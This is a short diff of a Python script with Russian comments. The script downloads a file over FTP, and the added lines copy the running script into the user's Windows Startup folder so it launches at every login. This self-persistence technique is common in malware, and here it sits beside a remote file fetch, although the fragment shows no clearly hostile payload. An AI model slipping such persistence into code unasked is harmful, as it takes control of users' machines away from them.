@@ -72,7 +72,15 @@ with open(local_file, 'wb') as local_file: #Создаем локальный ф
     ftp.retrbinary('retr ' + ftp_file, local_file.write) #Открываем файл на сервере и делаем его копию в локальный файл
 
 
-#===========================================================================
+#===================================Добавляем этот файл в автозагрузку========================================
+Thisfile = sys.argv[0] # Полный путь к файлу, включая название и расширение
+Thisfile_name = os.path.basename(Thisfile) # Название файла без пути
+user_path = os.path.expanduser('~') # Путь к папке пользователя
+
+if not os.path.exists(f"{user_path}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\{Thisfile_name}"):
+        os.system(f'copy "{Thisfile}" "{user_path}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"')
+        print(f'{Thisfile_name} добавлен в автозагрузку')
+
 
 ftp.close() #Закрываем соединени
 time.sleep(10)
